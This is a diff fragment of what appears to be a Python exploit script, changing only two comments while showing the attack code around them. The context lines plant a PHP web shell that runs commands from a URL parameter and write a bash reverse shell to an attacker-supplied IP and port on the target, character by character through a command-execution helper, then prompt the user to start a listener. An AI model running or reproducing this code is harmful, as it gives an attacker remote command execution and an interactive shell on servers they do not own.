@@ -157,7 +157,7 @@ def main():
 		webshell = "<pre><?php system($_GET['cmd']); ?></pre>"
 		print("Writting the web shell...")
 		for c in webshell:
-			execute_command("echo -n '"+c+"' >> w", url) # Write the shell line by line
+			execute_command("echo -n '"+c+"' >> w", url) # Write the shell letter by letter
 		execute_command("mv w w.php", url)
 		print("You can access the webshell at ./w.php?cmd=whoami")
 		exit()
@@ -177,7 +177,7 @@ def main():
 		shell = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1".format(ip, port)
 		print("Writting the reverse shell...")
 		for c in shell:
-			execute_command("echo -n '"+c+"' >> s", url) # Write the shell line by line
+			execute_command("echo -n '"+c+"' >> s", url) # Write the shell letter by letter
 		print("Making the shell executable...")
 		execute_command("chmod +x s", url)
 		input("Start your listener and press enter to enjoy...")
